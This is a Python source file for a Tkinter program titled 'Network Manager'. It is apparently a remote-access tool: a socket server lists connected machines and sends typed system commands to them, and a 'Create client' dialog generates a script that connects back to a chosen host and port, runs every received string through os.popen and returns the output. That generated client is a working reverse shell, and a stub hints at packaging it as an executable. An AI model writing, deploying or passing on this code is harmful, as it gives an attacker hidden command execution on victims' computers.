import socket, threading, time
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, StringVar


class Functions(object):
    def create_client_file(self, client_name, host, port):
        content = """from socket import *
from os import *
s = socket(AF_INET, SOCK_STREAM)
s.connect(("{0}", {1}))

while True:
    data = s.recv(2048).decode()
    output = popen(data).read()
    s.sendall(output.encode())
""".format(host, port)
        with open(client_name + ".py", "w") as f:
            f.write(content)

    def convert_py_to_exe(self):
        pass

class socketServer(object):
    def __init__(self, address, port, max_listen=100):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((address, port))
        self.server.listen(max_listen)
        self.clients = []

    def __call__(self):
        listener = threading.Thread(target=self.server_listener)
        listener.start()

    def server_listener(self):
        while True:
            client, address = self.server.accept()
            self.clients.append({"client":client, "address":address})

    def server_communicate(self, client_ip, data, returning_data=True, recv_buffsize=2048):
        client = self.get_client(client_ip)
        client_socket = client["client"]
        client_socket.sendall(data.encode())

        if returning_data:
            data = client_socket.recv(recv_buffsize)
            return data.decode()

    def get_client(self, client_ip):
        for dct in self.clients:
            if client_ip == dct["address"][0]:
                print(dct)
                return dct


class Program(object):
    def __init__(self, title, width, height):
        # basic window configurations
        self.root = tk.Tk()
        self.root.title(title)
        self.root.geometry("{0}x{1}".format(width, height))
        self.root.resizable(False, False)
        self.root.iconbitmap("network.ico")

        # creating menu for program
        menu = tk.Menu(self.root)
        self.root.config(menu=menu)
        # file menu ### need to add file menu commands in future..
        fileMenu = tk.Menu(menu)
        menu.add_cascade(label="File", menu=fileMenu)
        # settings menu ### need to update in future for functionality
        configMenu = tk.Menu(menu)
        configMenu.add_command(label="Set server", command=self.set_server)
        configMenu.add_command(label="Create client", command=self.create_client)
        configMenu.add_separator()
        configMenu.add_command(label="Options")
        menu.add_cascade(label="Config", menu=configMenu)

        # creating items for program
        self.server_status = StringVar()
        self.server_status.set("Server status: not running")

        lbl1 = tk.Label(self.root, text="System command:", font=("Arial", 10))
        lbl2 = tk.Label(self.root, text="Choose client:", font=("Arial", 10))
        self.server_status_label = tk.Label(self.root, textvariable=self.server_status, font=("Arial", 12))
        self.ent1 = tk.Entry(self.root, width=50)
        self.combo1 = ttk.Combobox(self.root, state="readonly")
        self.textbox1 = scrolledtext.ScrolledText(self.root, width=75, height=10, state=tk.DISABLED)
        btn1 = tk.Button(self.root, text="Execute", width=15, height=2, command=self.execute_system_command)

        # locating items on gui
        lbl1.place(x=5, y=60)
        self.ent1.place(x=125, y=60)
        lbl2.place(x=460, y=40)
        self.combo1.place(x=460, y=60)
        self.textbox1.place(x=5, y=100)
        btn1.place(x=5, y=280)
        self.server_status_label.place(x=220, y=285)

    def __call__(self):
        self.root.mainloop()

    def set_server(self):
        # basic window configurations
        self.set_server_window = tk.Toplevel(self.root)
        self.set_server_window.title("Set server")
        self.set_server_window.geometry("230x155")
        self.set_server_window.resizable(False, False)
        self.set_server_window.iconbitmap("network.ico")

        # creating items for window
        lbl1 = tk.Label(self.set_server_window, text="Server settings", font=("Arial", 13))
        lbl2 = tk.Label(self.set_server_window, text="Host:", font=("Arial", 10))
        lbl3 = tk.Label(self.set_server_window, text="Port:", font=("Arial", 10))
        self.address = tk.Entry(self.set_server_window, width=20)
        self.port = tk.Entry(self.set_server_window, width=7)
        btn1 = tk.Button(self.set_server_window, text="Start server", command=self.start_server)

        # locating items on window
        lbl1.place(x=55, y=10)
        lbl2.place(x=10, y=50)
        self.address.place(x=55, y=50)
        lbl3.place(x=10, y=80)
        self.port.place(x=55, y=80)
        btn1.place(x=55, y=120)

    def start_server(self):
        try:
            self.server = socketServer(self.address.get(), int(self.port.get()))
            self.server()
            clients_updater = threading.Thread(target=self.update_server_clients)
            clients_updater.start()
        except Exception as e:
            messagebox.showerror("Network Manager error", "Error: can't start server\nDetails: {0}".format(e))
        else:
            self.update_server_status(True)
        finally:
            self.set_server_window.destroy()

    def update_server_status(self, state):
        if state:
            self.server_status.set("Server status: running")
        else:
            self.server_status.set("Server status: not running")

    def update_server_clients(self):
        while True:
            addresses = []
            for client in self.server.clients:
                addresses.append(client["address"][0])
            self.combo1["values"] = addresses
            time.sleep(5)

    def execute_system_command(self):
        command = self.ent1.get()
        self.ent1.delete(0, tk.END)
        address = self.combo1.get()
        data = self.server.server_communicate(address, command)
        self.textbox1.config(state=tk.NORMAL)
        self.textbox1.insert(tk.END, data)
        self.textbox1.config(state=tk.DISABLED)

    def create_client(self):
        # basic window configurations
        self.create_client_window = tk.Toplevel(self.root)
        self.create_client_window.title("Create client")
        self.create_client_window.geometry("250x190")
        self.create_client_window.resizable(False, False)
        self.create_client_window.iconbitmap("network.ico")

        # creating items for window
        lbl1 = tk.Label(self.create_client_window, text="Create client", font=("Arial", 13))
        lbl2 = tk.Label(self.create_client_window, text="File name:", font=("Arial", 10))
        lbl3 = tk.Label(self.create_client_window, text="Host:", font=("Arial", 10))
        lbl4 = tk.Label(self.create_client_window, text="Port:", font=("Arial", 10))
        self.server_address = tk.Entry(self.create_client_window, width=20)
        self.server_port = tk.Entry(self.create_client_window, width=7)
        self.client_name = tk.Entry(self.create_client_window, width=20)

        btn1 = tk.Button(self.create_client_window, text="Create", command=self.create_client_event)

        # locating items on window
        lbl1.place(x=55, y=10)
        lbl2.place(x=10, y=50)
        self.client_name.place(x=85, y=50)
        lbl3.place(x=10, y=80)
        self.server_address.place(x=85, y=80)
        lbl4.place(x=10, y=110)
        self.server_port.place(x=85, y=110)
        btn1.place(x=85, y=150)

    def create_client_event(self):
        functions = Functions()
        functions.create_client_file(self.client_name.get(), self.server_address.get(), self.server_port.get())
        self.create_client_window.destroy()




if __name__ == "__main__":
    program = Program("Network Manager", 635, 350)
    program()
